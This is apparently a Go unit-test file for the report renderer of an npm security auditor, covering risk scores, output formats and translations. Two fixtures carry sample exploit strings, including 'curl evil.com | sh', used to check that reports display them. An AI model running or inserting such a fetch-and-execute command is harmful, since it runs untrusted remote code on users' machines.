package reporter

import (
	"bytes"
	"encoding/json"
	"errors"
	"strings"
	"testing"

	"github.com/kluth/npm-security-auditter/internal/analyzer"
)

func TestCalculateRiskScore(t *testing.T) {
	tests := []struct {
		name    string
		results []analyzer.Result
		want    int
	}{
		{
			name:    "no findings",
			results: nil,
			want:    0,
		},
		{
			name: "single low",
			results: []analyzer.Result{
				{Findings: []analyzer.Finding{{Severity: analyzer.SeverityLow}}},
			},
			want: 2,
		},
		{
			name: "single critical",
			results: []analyzer.Result{
				{Findings: []analyzer.Finding{{Severity: analyzer.SeverityCritical}}},
			},
			want: 25,
		},
		{
			name: "mixed findings",
			results: []analyzer.Result{
				{Findings: []analyzer.Finding{
					{Severity: analyzer.SeverityCritical},
					{Severity: analyzer.SeverityHigh},
					{Severity: analyzer.SeverityMedium},
					{Severity: analyzer.SeverityLow},
				}},
			},
			want: 47, // 25 + 15 + 5 + 2
		},
		{
			name: "capped at 100",
			results: []analyzer.Result{
				{Findings: []analyzer.Finding{
					{Severity: analyzer.SeverityCritical},
					{Severity: analyzer.SeverityCritical},
					{Severity: analyzer.SeverityCritical},
					{Severity: analyzer.SeverityCritical},
					{Severity: analyzer.SeverityCritical},
				}},
			},
			want: 100,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := CalculateRiskScore(tt.results)
			if got != tt.want {
				t.Errorf("CalculateRiskScore() = %d, want %d", got, tt.want)
			}
		})
	}
}

func TestRenderTerminal(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatTerminal, LangEN)

	report := Report{
		Package: "test-pkg",
		Version: "1.0.0",
		Results: []analyzer.Result{
			{
				AnalyzerName: "test-analyzer",
				Findings: []analyzer.Finding{
					{
						Analyzer:    "test-analyzer",
						Title:       "Test Issue",
						Description: "A test finding",
						Severity:    analyzer.SeverityHigh,
					},
				},
			},
		},
	}

	err := r.Render(report)
	if err != nil {
		t.Fatalf("Render() error = %v", err)
	}

	output := buf.String()
	if !strings.Contains(output, "test-pkg") {
		t.Error("output should contain package name")
	}
	if !strings.Contains(output, "Test Issue") {
		t.Error("output should contain finding title")
	}
}

func TestRenderJSON(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatJSON, LangEN)

	report := Report{
		Package: "test-pkg",
		Version: "1.0.0",
		Results: []analyzer.Result{
			{
				AnalyzerName: "test-analyzer",
				Findings: []analyzer.Finding{
					{
						Analyzer:    "test-analyzer",
						Title:       "Test Issue",
						Description: "A test finding",
						Severity:    analyzer.SeverityHigh,
					},
				},
			},
		},
	}

	err := r.Render(report)
	if err != nil {
		t.Fatalf("Render() error = %v", err)
	}

	var parsed Report
	if err := json.Unmarshal(buf.Bytes(), &parsed); err != nil {
		t.Fatalf("JSON output is not valid: %v", err)
	}
	if parsed.Package != "test-pkg" {
		t.Errorf("JSON package = %q, want %q", parsed.Package, "test-pkg")
	}
}

func TestRenderNoFindings(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatTerminal, LangEN)

	report := Report{
		Package: "safe-pkg",
		Version: "2.0.0",
		Results: []analyzer.Result{
			{AnalyzerName: "test", Findings: nil},
		},
	}

	err := r.Render(report)
	if err != nil {
		t.Fatalf("Render() error = %v", err)
	}

	output := buf.String()
	if !strings.Contains(output, "No issues found") {
		t.Error("output should indicate no issues found")
	}
}

func TestRenderWithErrors(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatTerminal, LangEN)

	report := Report{
		Package: "err-pkg",
		Version: "1.0.0",
		Results: []analyzer.Result{
			{
				AnalyzerName: "failing-analyzer",
				Err:          errors.New("connection timeout"),
			},
		},
	}

	err := r.Render(report)
	if err != nil {
		t.Fatalf("Render() error = %v", err)
	}

	output := buf.String()
	if !strings.Contains(output, "failing-analyzer") {
		t.Error("output should mention the failing analyzer")
	}
}

func TestSeverityHelpers(t *testing.T) {
	tests := []struct {
		s    analyzer.Severity
		wantColor string
		wantIcon  string
	}{
		{analyzer.SeverityCritical, colorRed, "✖"},
		{analyzer.SeverityHigh, colorRed, "!"},
		{analyzer.SeverityMedium, colorYellow, "~"},
		{analyzer.SeverityLow, colorDim, "-"},
	}

	for _, tt := range tests {
		if got := severityColor(tt.s); got != tt.wantColor {
			t.Errorf("severityColor(%q) = %q, want %q", tt.s, got, tt.wantColor)
		}
		if got := severityIcon(tt.s); got != tt.wantIcon {
			t.Errorf("severityIcon(%q) = %q, want %q", tt.s, got, tt.wantIcon)
		}
	}
}

func TestRiskLevel(t *testing.T) {
	r := New(nil, FormatTerminal, LangEN)
	tests := []struct {
		score int
		wantColor string
		wantLabel string
	}{
		{100, colorRed, "CRITICAL RISK"},
		{70, colorRed, "CRITICAL RISK"},
		{69, colorYellow, "MODERATE RISK"},
		{40, colorYellow, "MODERATE RISK"},
		{39, colorBlue, "ELEVATED RISK"},
		{20, colorBlue, "ELEVATED RISK"},
		{19, colorGreen, "LOW RISK"},
		{0, colorGreen, "LOW RISK"},
	}

	for _, tt := range tests {
		color, label := r.GetRiskLevel(tt.score)
		if color != tt.wantColor {
			t.Errorf("GetRiskLevel(%d) color = %q, want %q", tt.score, color, tt.wantColor)
		}
		if label != tt.wantLabel {
			t.Errorf("GetRiskLevel(%d) label = %q, want %q", tt.score, label, tt.wantLabel)
		}
	}
}

func TestPluralize(t *testing.T) {
	r := New(nil, FormatTerminal, LangEN)
	if r.pluralize(1) != "finding" {
		t.Error("pluralize(1) should be finding")
	}
	if r.pluralize(2) != "findings" {
		t.Error("pluralize(2) should be findings")
	}
}

func TestPrintWrapped(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatTerminal, LangEN)

	r.printWrapped(&buf, "this is a very long text that should be wrapped", "  ", 20)
	
	lines := strings.Split(buf.String(), "\n")
	for _, line := range lines {
		if len(line) > 20 && line != "" {
			t.Errorf("line exceeds width: %q", line)
		}
	}
}

func TestSeverityColorForCount(t *testing.T) {
	arg := struct {
		name     string
		total    int
		critical int
		high     int
		medium   int
		low      int
	}{critical: 1}
	if severityColorForCount(arg) != colorRed {
		t.Error("expected colorRed for critical")
	}
}

func TestGenerateRecommendations(t *testing.T) {
	r := New(nil, FormatTerminal, LangEN)
	recs := r.generateRecommendations(70, nil)
	found := false
	for _, rec := range recs {
		if strings.Contains(rec, "DO NOT install") {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected recommendation for critical risk")
	}
}

func TestKlingon(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatTerminal, LangTLH)
	report := Report{
		Package: "klingon-pkg",
		Version: "1.0.0",
	}
	r.Render(report)
	if !strings.Contains(buf.String(), "npm QaD Qu' 'oH") {
		t.Error("expected Klingon title")
	}
}

func TestVulcan(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatTerminal, LangVUL)
	report := Report{
		Package: "vulcan-pkg",
		Version: "1.0.0",
	}
	r.Render(report)
	if !strings.Contains(buf.String(), "Probability Analysis") {
		t.Error("expected Vulcan risk assessment label")
	}
}

func TestMarkdown(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatMarkdown, LangEN)
	report := Report{
		Package: "md-pkg",
		Version: "1.0.0",
	}
	r.Render(report)
	if !strings.HasPrefix(buf.String(), "#") {
		t.Error("expected Markdown header")
	}
}

func TestHTML(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatHTML, LangEN)
	report := Report{
		Package: "html-pkg",
		Version: "1.0.0",
	}
	r.Render(report)
	if !strings.Contains(buf.String(), "<html>") {
		t.Error("expected HTML tags")
	}
}

func TestCSV(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatCSV, LangEN)
	report := Report{
		Package: "csv-pkg",
		Version: "1.0.0",
		Results: []analyzer.Result{
			{
				Findings: []analyzer.Finding{
					{Severity: analyzer.SeverityHigh, Analyzer: "test", Title: "Issue", Description: "Desc"},
				},
			},
		},
	}
	r.Render(report)
	if !strings.Contains(buf.String(), "Severity,Analyzer,Title,Description") {
		t.Error("expected CSV header")
	}
	if !strings.Contains(buf.String(), "HIGH,test,\"Issue\",\"Desc\"") {
		t.Error("expected CSV data")
	}
}

func TestPDF(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatPDF, LangEN)
	report := Report{
		Package: "pdf-pkg",
		Version: "1.0.0",
		Results: []analyzer.Result{
			{
				Findings: []analyzer.Finding{
					{Severity: analyzer.SeverityHigh, Analyzer: "test", Title: "Issue", Description: "Desc"},
				},
			},
		},
	}
	err := r.Render(report)
	if err != nil {
		t.Fatalf("PDF Render() error = %v", err)
	}
	if buf.Len() == 0 {
		t.Error("expected PDF output to be non-empty")
	}
	// PDF header usually starts with %PDF-
	if !strings.HasPrefix(buf.String(), "%PDF-") {
		t.Error("expected PDF header %PDF-")
	}
}

func TestPDFWithExploitAndRemediation(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatPDF, LangEN)
	report := Report{
		Package: "pdf-detailed",
		Version: "2.0.0",
		Results: []analyzer.Result{
			{
				Findings: []analyzer.Finding{
					{
						Severity:       analyzer.SeverityCritical,
						Analyzer:       "test",
						Title:          "Critical Issue",
						Description:    "A critical finding",
						ExploitExample: "Attacker runs: curl evil.com",
						Remediation:    "Update to latest version",
					},
				},
			},
		},
		Info: PackageInfo{License: "MIT"},
	}
	err := r.Render(report)
	if err != nil {
		t.Fatalf("PDF Render() error = %v", err)
	}
	if buf.Len() == 0 {
		t.Error("expected non-empty PDF")
	}
}

func TestPDFNoFindings(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatPDF, LangEN)
	report := Report{
		Package: "safe-pdf",
		Version: "1.0.0",
		Results: []analyzer.Result{},
	}
	err := r.Render(report)
	if err != nil {
		t.Fatalf("PDF Render() error = %v", err)
	}
}

func TestNewDefaults(t *testing.T) {
	r := New(nil, "", "")
	if r.format != FormatTerminal {
		t.Errorf("expected default format %q, got %q", FormatTerminal, r.format)
	}
	if r.lang != LangEN {
		t.Errorf("expected default lang %q, got %q", LangEN, r.lang)
	}
}

func TestSeverityColorDefault(t *testing.T) {
	got := severityColor(99) // unknown severity
	if got != colorWhite {
		t.Errorf("severityColor(99) = %q, want %q", got, colorWhite)
	}
}

func TestSeverityIconDefault(t *testing.T) {
	got := severityIcon(99) // unknown severity
	if got != " " {
		t.Errorf("severityIcon(99) = %q, want %q", got, " ")
	}
}

func TestSeverityColorForCountAllCases(t *testing.T) {
	type entry struct {
		name     string
		total    int
		critical int
		high     int
		medium   int
		low      int
	}

	tests := []struct {
		e    entry
		want string
	}{
		{entry{critical: 1, total: 1}, colorRed},
		{entry{high: 1, total: 1}, colorRed},
		{entry{medium: 1, total: 1}, colorYellow},
		{entry{low: 1, total: 1}, colorDim},
		{entry{total: 0}, colorDim},
	}

	for _, tt := range tests {
		got := severityColorForCount(tt.e)
		if got != tt.want {
			t.Errorf("severityColorForCount(%+v) = %q, want %q", tt.e, got, tt.want)
		}
	}
}

func TestGetSeverityLabel(t *testing.T) {
	r := New(nil, FormatTerminal, LangEN)
	tests := []struct {
		sev  analyzer.Severity
		want string
	}{
		{analyzer.SeverityCritical, "CRITICAL"},
		{analyzer.SeverityHigh, "HIGH"},
		{analyzer.SeverityMedium, "MEDIUM"},
		{analyzer.SeverityLow, "LOW"},
		{99, "UNKNOWN"}, // default falls through to String()
	}
	for _, tt := range tests {
		got := r.GetSeverityLabel(tt.sev)
		if got != tt.want {
			t.Errorf("GetSeverityLabel(%d) = %q, want %q", tt.sev, got, tt.want)
		}
	}
}

func TestTFallbackToKey(t *testing.T) {
	r := New(nil, FormatTerminal, LangEN)
	// Key that doesn't exist in any language
	got := r.T("nonexistent_key_xyz")
	if got != "nonexistent_key_xyz" {
		t.Errorf("T() should return key when not found, got %q", got)
	}
}

func TestTUnknownLanguageFallsBackToEnglish(t *testing.T) {
	r := New(nil, FormatTerminal, "xx")
	got := r.T("title")
	if got != "npm Security Audit Report" {
		t.Errorf("T() with unknown lang should fall back to English, got %q", got)
	}
}

func TestTWithArgs(t *testing.T) {
	r := New(nil, FormatTerminal, LangEN)
	got := r.T("score_label", 42)
	if got != "Score: 42 / 100" {
		t.Errorf("T() with args = %q, want %q", got, "Score: 42 / 100")
	}
}

func TestTLanguageFallbackToEnglishKey(t *testing.T) {
	// German lang, key exists only in English
	r := New(nil, FormatTerminal, LangDE)
	got := r.T("nonexistent_key_xyz")
	if got != "nonexistent_key_xyz" {
		t.Errorf("T() should fall back to key, got %q", got)
	}
}

func TestRenderTerminalAllSeverities(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatTerminal, LangEN)

	report := Report{
		Package: "full-test",
		Version: "1.0.0",
		Info: PackageInfo{
			License:       "MIT",
			Maintainers:   []string{"alice", "bob"},
			RepoURL:       "https://github.com/test/repo",
			CreatedAt:     "2024-01-01",
			TotalVersions: 5,
			Dependencies:  3,
			HasScripts:    true,
		},
		Results: []analyzer.Result{
			{
				AnalyzerName: "test-analyzer",
				Findings: []analyzer.Finding{
					{Analyzer: "test-analyzer", Title: "Critical Issue", Description: "desc", Severity: analyzer.SeverityCritical, ExploitExample: "exploit\nexample", Remediation: "fix it"},
					{Analyzer: "test-analyzer", Title: "High Issue", Description: "desc", Severity: analyzer.SeverityHigh},
					{Analyzer: "test-analyzer", Title: "Medium Issue", Description: "desc", Severity: analyzer.SeverityMedium},
					{Analyzer: "test-analyzer", Title: "Low Issue", Description: "desc", Severity: analyzer.SeverityLow},
				},
			},
			{
				AnalyzerName: "clean-analyzer",
				Findings:     nil,
			},
		},
	}

	err := r.Render(report)
	if err != nil {
		t.Fatalf("Render() error = %v", err)
	}

	output := buf.String()
	// Check all severity sections
	if !strings.Contains(output, "CRITICAL") {
		t.Error("expected CRITICAL in output")
	}
	if !strings.Contains(output, "HIGH") {
		t.Error("expected HIGH in output")
	}
	if !strings.Contains(output, "MEDIUM") {
		t.Error("expected MEDIUM in output")
	}
	if !strings.Contains(output, "LOW") {
		t.Error("expected LOW in output")
	}
	// Check package info fields
	if !strings.Contains(output, "MIT") {
		t.Error("expected license in output")
	}
	if !strings.Contains(output, "alice") {
		t.Error("expected maintainer in output")
	}
	if !strings.Contains(output, "github.com") {
		t.Error("expected repo URL in output")
	}
	if !strings.Contains(output, "2024-01-01") {
		t.Error("expected created date in output")
	}
	if !strings.Contains(output, "YES") {
		t.Error("expected scripts YES in output")
	}
	if !strings.Contains(output, "exploit") {
		t.Error("expected exploit example in output")
	}
	if !strings.Contains(output, "fix it") {
		t.Error("expected remediation in output")
	}
}

func TestRenderTerminalNoScripts(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatTerminal, LangEN)

	report := Report{
		Package: "no-scripts-pkg",
		Version: "1.0.0",
		Info:    PackageInfo{HasScripts: false},
	}

	err := r.Render(report)
	if err != nil {
		t.Fatalf("Render() error = %v", err)
	}
	if !strings.Contains(buf.String(), "None") {
		t.Error("expected 'None' for scripts")
	}
}

func TestRenderMarkdownWithFindings(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatMarkdown, LangEN)

	report := Report{
		Package: "md-detailed",
		Version: "1.0.0",
		Info:    PackageInfo{License: "Apache-2.0"},
		Results: []analyzer.Result{
			{
				Findings: []analyzer.Finding{
					{
						Severity:       analyzer.SeverityHigh,
						Analyzer:       "scripts",
						Title:          "Dangerous Script",
						Description:    "Found dangerous script",
						ExploitExample: "curl evil.com | sh",
						Remediation:    "Remove the script",
					},
				},
			},
		},
	}

	err := r.Render(report)
	if err != nil {
		t.Fatalf("Render() error = %v", err)
	}

	output := buf.String()
	if !strings.Contains(output, "Dangerous Script") {
		t.Error("expected finding title in markdown")
	}
	if !strings.Contains(output, "curl evil.com") {
		t.Error("expected exploit in markdown")
	}
	if !strings.Contains(output, "Remove the script") {
		t.Error("expected remediation in markdown")
	}
	if !strings.Contains(output, "Apache-2.0") {
		t.Error("expected license in markdown")
	}
}

func TestRenderHTMLWithFindings(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatHTML, LangEN)

	report := Report{
		Package: "html-detailed",
		Version: "1.0.0",
		Results: []analyzer.Result{
			{
				Findings: []analyzer.Finding{
					{
						Severity:       analyzer.SeverityHigh,
						Analyzer:       "test",
						Title:          "HTML Issue",
						Description:    "Found issue",
						ExploitExample: "exploit example",
						Remediation:    "fix this",
					},
				},
			},
		},
	}

	err := r.Render(report)
	if err != nil {
		t.Fatalf("Render() error = %v", err)
	}

	output := buf.String()
	if !strings.Contains(output, "HTML Issue") {
		t.Error("expected finding in HTML")
	}
	if !strings.Contains(output, "exploit example") {
		t.Error("expected exploit in HTML")
	}
	if !strings.Contains(output, "fix this") {
		t.Error("expected remediation in HTML")
	}
}

func TestRenderProjectJSON(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatJSON, LangEN)

	pr := ProjectReport{
		ProjectName: "my-project",
		Reports: []Report{
			{Package: "pkg-a", Version: "1.0.0"},
			{Package: "pkg-b", Version: "2.0.0"},
		},
	}

	err := r.RenderProject(pr)
	if err != nil {
		t.Fatalf("RenderProject() error = %v", err)
	}

	var parsed ProjectReport
	if err := json.Unmarshal(buf.Bytes(), &parsed); err != nil {
		t.Fatalf("JSON output is not valid: %v", err)
	}
	if parsed.ProjectName != "my-project" {
		t.Errorf("ProjectName = %q, want %q", parsed.ProjectName, "my-project")
	}
	if len(parsed.Reports) != 2 {
		t.Errorf("expected 2 reports, got %d", len(parsed.Reports))
	}
}

func TestRenderProjectTerminal(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatTerminal, LangEN)

	pr := ProjectReport{
		ProjectName: "test-project",
		Reports: []Report{
			{Package: "pkg-a", Version: "1.0.0"},
		},
	}

	err := r.RenderProject(pr)
	if err != nil {
		t.Fatalf("RenderProject() error = %v", err)
	}

	output := buf.String()
	if !strings.Contains(output, "test-project") {
		t.Error("expected project name in output")
	}
}

func TestRenderProjectPDF(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatPDF, LangEN)

	pr := ProjectReport{
		ProjectName: "pdf-project",
		Reports: []Report{
			{
				Package: "pkg-a",
				Version: "1.0.0",
				Results: []analyzer.Result{
					{
						Findings: []analyzer.Finding{
							{Severity: analyzer.SeverityHigh, Analyzer: "test", Title: "Issue", Description: "Desc"},
						},
					},
				},
			},
		},
	}

	err := r.RenderProject(pr)
	if err != nil {
		t.Fatalf("RenderProject() error = %v", err)
	}
	if !strings.HasPrefix(buf.String(), "%PDF-") {
		t.Error("expected PDF output")
	}
}

func TestGenerateRecommendationsAllTypes(t *testing.T) {
	r := New(nil, FormatTerminal, LangEN)

	findings := []analyzer.Finding{
		{Analyzer: "install-scripts", Severity: analyzer.SeverityHigh, Title: "Script issue"},
		{Analyzer: "typosquatting", Severity: analyzer.SeverityHigh, Title: "Typosquat"},
		{Analyzer: "vulnerabilities", Severity: analyzer.SeverityHigh, Title: "Vuln"},
		{Analyzer: "provenance", Severity: analyzer.SeverityMedium, Title: "No provenance attestation"},
		{Analyzer: "dependencies", Severity: analyzer.SeverityMedium, Title: "Dep issue"},
		{Analyzer: "maintainers", Severity: analyzer.SeverityMedium, Title: "Maintainer risk"},
	}

	recs := r.generateRecommendations(70, findings)

	checks := []string{
		"DO NOT install",
		"--ignore-scripts",
		"typosquat",
		"vulnerabilities",
		"provenance",
		"dependency",
		"maintainer",
	}

	for _, check := range checks {
		found := false
		for _, rec := range recs {
			if strings.Contains(strings.ToLower(rec), strings.ToLower(check)) {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("expected recommendation containing %q", check)
		}
	}
}

func TestGenerateRecommendationsModerate(t *testing.T) {
	r := New(nil, FormatTerminal, LangEN)
	recs := r.generateRecommendations(40, nil)
	found := false
	for _, rec := range recs {
		if strings.Contains(rec, "Review all HIGH") {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected moderate recommendation")
	}
}

func TestGenerateRecommendationsSafe(t *testing.T) {
	r := New(nil, FormatTerminal, LangEN)
	recs := r.generateRecommendations(0, nil)
	if len(recs) != 1 {
		t.Errorf("expected 1 recommendation for safe, got %d", len(recs))
	}
	if !strings.Contains(recs[0], "safe") {
		t.Error("expected safe recommendation")
	}
}

func TestPrintRiskBarEdgeCases(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatTerminal, LangEN)

	// score > 100 should be capped
	r.printRiskBar(&buf, 150, colorRed)
	if !strings.Contains(buf.String(), "150%") {
		t.Error("expected 150% in risk bar")
	}
}

func TestPrintWrappedNoSpace(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatTerminal, LangEN)

	// Very long word with no spaces
	r.printWrapped(&buf, "abcdefghijklmnopqrstuvwxyz1234567890", "  ", 20)
	output := buf.String()
	if len(output) == 0 {
		t.Error("expected output")
	}
}

func TestPrintWrappedNarrowWidth(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatTerminal, LangEN)

	// Width <= indent length triggers maxLen fallback
	r.printWrapped(&buf, "hello world", "                                                                            ", 10)
	if len(buf.String()) == 0 {
		t.Error("expected output")
	}
}

func TestPrintAnalyzerBreakdownAllSeverities(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatTerminal, LangEN)

	results := []analyzer.Result{
		{
			AnalyzerName: "multi",
			Findings: []analyzer.Finding{
				{Severity: analyzer.SeverityCritical},
				{Severity: analyzer.SeverityHigh},
				{Severity: analyzer.SeverityMedium},
				{Severity: analyzer.SeverityLow},
			},
		},
		{
			AnalyzerName: "clean",
			Findings:     nil,
		},
	}

	r.printAnalyzerBreakdown(&buf, results)
	output := buf.String()
	if !strings.Contains(output, "multi") {
		t.Error("expected analyzer name 'multi'")
	}
	if !strings.Contains(output, "clean") {
		t.Error("expected analyzer name 'clean'")
	}
}

func TestAllLanguagesHaveRequiredKeys(t *testing.T) {
	requiredKeys := []string{
		"title", "pkg_info", "package", "risk_assessment",
		"no_issues", "findings_summary", "recommendations",
	}

	for lang, trans := range translations {
		for _, key := range requiredKeys {
			if _, ok := trans[key]; !ok {
				t.Errorf("language %q missing required key %q", lang, key)
			}
		}
	}
}

func TestRenderMarkdownNoFindings(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatMarkdown, LangEN)
	report := Report{Package: "safe-md", Version: "1.0.0"}
	err := r.Render(report)
	if err != nil {
		t.Fatalf("error: %v", err)
	}
	if !strings.Contains(buf.String(), "No issues found") {
		t.Error("expected no issues message in markdown")
	}
}

func TestRenderHTMLNoFindings(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatHTML, LangEN)
	report := Report{Package: "safe-html", Version: "1.0.0"}
	err := r.Render(report)
	if err != nil {
		t.Fatalf("error: %v", err)
	}
	output := buf.String()
	if !strings.Contains(output, "</html>") {
		t.Error("expected closing html tag")
	}
}

func TestCollectFindings(t *testing.T) {
	results := []analyzer.Result{
		{Findings: []analyzer.Finding{{Title: "a"}, {Title: "b"}}},
		{Findings: []analyzer.Finding{{Title: "c"}}},
		{Findings: nil},
	}
	all := collectFindings(results)
	if len(all) != 3 {
		t.Errorf("expected 3 findings, got %d", len(all))
	}
}

func TestFilterBySeverity(t *testing.T) {
	findings := []analyzer.Finding{
		{Severity: analyzer.SeverityHigh},
		{Severity: analyzer.SeverityLow},
		{Severity: analyzer.SeverityHigh},
	}
	filtered := filterBySeverity(findings, analyzer.SeverityHigh)
	if len(filtered) != 2 {
		t.Errorf("expected 2 high findings, got %d", len(filtered))
	}
}

func TestCountActiveAnalyzers(t *testing.T) {
	results := []analyzer.Result{
		{Err: nil},
		{Err: errors.New("fail")},
		{Err: nil},
	}
	got := countActiveAnalyzers(results)
	if got != 2 {
		t.Errorf("expected 2 active analyzers, got %d", got)
	}
}

func TestRenderTerminalWithAnalyzerError(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatTerminal, LangEN)
	report := Report{
		Package: "test-pkg",
		Version: "1.0.0",
		Score:   50,
		Results: []analyzer.Result{
			{
				AnalyzerName: "vuln-check",
				Err:          errors.New("connection refused"),
			},
			{
				AnalyzerName: "scripts",
				Findings: []analyzer.Finding{
					{Title: "test", Description: "desc", Severity: analyzer.SeverityHigh, Analyzer: "scripts"},
				},
			},
		},
	}
	err := r.Render(report)
	if err != nil {
		t.Fatal(err)
	}
	output := buf.String()
	if !strings.Contains(output, "connection refused") {
		t.Error("expected analyzer error in output")
	}
}

func TestRenderProjectMarkdown(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatMarkdown, LangEN)
	pr := ProjectReport{
		ProjectName: "test-project",
		Reports: []Report{
			{Package: "pkg1", Version: "1.0.0", Score: 10},
		},
	}
	err := r.RenderProject(pr)
	if err != nil {
		t.Fatal(err)
	}
	output := buf.String()
	if !strings.Contains(output, "test-project") {
		t.Error("expected project name in markdown output")
	}
}

func TestRenderProjectHTML(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatHTML, LangEN)
	pr := ProjectReport{
		ProjectName: "test-project",
		Reports: []Report{
			{Package: "pkg1", Version: "1.0.0", Score: 10},
		},
	}
	err := r.RenderProject(pr)
	if err != nil {
		t.Fatal(err)
	}
	output := buf.String()
	if !strings.Contains(output, "test-project") {
		t.Error("expected project name in HTML output")
	}
}

func TestRenderProjectCSV(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatCSV, LangEN)
	pr := ProjectReport{
		ProjectName: "test-project",
		Reports: []Report{
			{Package: "pkg1", Version: "1.0.0", Score: 10},
		},
	}
	err := r.RenderProject(pr)
	if err != nil {
		t.Fatal(err)
	}
	output := buf.String()
	if !strings.Contains(output, "test-project") {
		t.Error("expected project name in CSV output")
	}
}

func TestRenderTerminalNoFindings(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatTerminal, LangEN)
	report := Report{
		Package: "safe-pkg",
		Version: "1.0.0",
		Score:   0,
		Results: []analyzer.Result{
			{AnalyzerName: "scripts", Findings: nil},
		},
	}
	err := r.Render(report)
	if err != nil {
		t.Fatal(err)
	}
	output := buf.String()
	if !strings.Contains(output, "No issues found") {
		t.Error("expected 'No issues found' message for clean package")
	}
}

func TestTWithEmptyLang(t *testing.T) {
	// Directly create reporter with empty lang to test fallback in T()
	var buf bytes.Buffer
	r := &Reporter{writer: &buf, format: FormatTerminal, lang: ""}
	val := r.T("title")
	if val == "" || val == "title" {
		t.Error("expected English fallback for empty lang")
	}
}

func TestRenderProjectWithRenderError(t *testing.T) {
	// Use a writer that fails after some bytes
	w := &failWriter{failAfter: 50}
	r := New(w, FormatTerminal, LangEN)
	pr := ProjectReport{
		ProjectName: "test",
		Reports: []Report{
			{
				Package: "pkg1",
				Version: "1.0.0",
				Score:   50,
				Results: []analyzer.Result{
					{
						AnalyzerName: "test",
						Findings: []analyzer.Finding{
							{Title: "issue", Description: "desc", Severity: analyzer.SeverityHigh, Analyzer: "test"},
						},
					},
				},
			},
		},
	}
	// This may or may not error depending on buffering, but exercises the path
	_ = r.RenderProject(pr)
}

type failWriter struct {
	written   int
	failAfter int
}

func (w *failWriter) Write(p []byte) (int, error) {
	w.written += len(p)
	if w.written > w.failAfter {
		return 0, errors.New("write failed")
	}
	return len(p), nil
}

func TestPrintAnalyzerBreakdownSmallTotal(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatTerminal, LangEN)
	// Create results where one analyzer has 1 finding and another has 100
	// This tests barLen=0 && e.total>0 branch
	results := []analyzer.Result{
		{
			AnalyzerName: "big-analyzer",
			Findings: func() []analyzer.Finding {
				f := make([]analyzer.Finding, 100)
				for i := range f {
					f[i] = analyzer.Finding{Title: "x", Severity: analyzer.SeverityLow}
				}
				return f
			}(),
		},
		{
			AnalyzerName: "tiny-analyzer",
			Findings:     []analyzer.Finding{{Title: "y", Severity: analyzer.SeverityHigh}},
		},
	}
	r.printAnalyzerBreakdown(&buf, results)
	output := buf.String()
	if !strings.Contains(output, "big-analyzer") || !strings.Contains(output, "tiny-analyzer") {
		t.Error("expected both analyzers in breakdown")
	}
}

func TestSindarin(t *testing.T) {
	var buf bytes.Buffer
	r := New(&buf, FormatTerminal, LangSIN)
	report := Report{Package: "elvish-pkg", Version: "1.0.0"}
	r.Render(report)
	if !strings.Contains(buf.String(), "Omen Analysis") {
		t.Error("expected Sindarin risk assessment label")
	}
}